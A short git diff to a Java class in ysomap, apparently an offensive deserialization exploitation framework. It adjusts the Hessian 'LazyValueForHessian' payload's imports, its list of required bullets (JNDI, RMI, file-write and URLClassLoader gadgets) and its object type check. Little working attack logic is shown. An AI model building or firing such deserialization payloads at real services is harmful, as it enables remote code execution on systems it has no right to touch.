@@ -1,7 +1,6 @@
 package ysomap.payloads.hessian;
 
 import com.sun.org.apache.xml.internal.utils.FastStringBuffer;
-import sun.swing.SwingLazyValue;
 import ysomap.bullets.Bullet;
 import ysomap.bullets.jdk.SwingLazyValueWithRMIBullet;
 import ysomap.common.annotation.*;
@@ -23,7 +22,8 @@ import javax.swing.*;
 @Require(bullets = {
         "SwingLazyValueWithJNDIBullet",
         "SwingLazyValueWithRMIBullet",
-        "SwingLazyValueWithFileWriteBullet",
+        "LazyValueWithFileWrite1Bullet",
+        "LazyValueWithFileWrite2Bullet",
         "SwingLazyValueWithUrlClassLoaderBullet"}, param = false)
 public class LazyValueForHessian extends HessianPayload {
 
@@ -34,7 +34,7 @@ public class LazyValueForHessian extends HessianPayload {
 
     @Override
     public boolean checkObject(Object obj) {
-        return obj instanceof SwingLazyValue;
+        return obj instanceof UIDefaults.LazyValue;
     }
 
     @Override
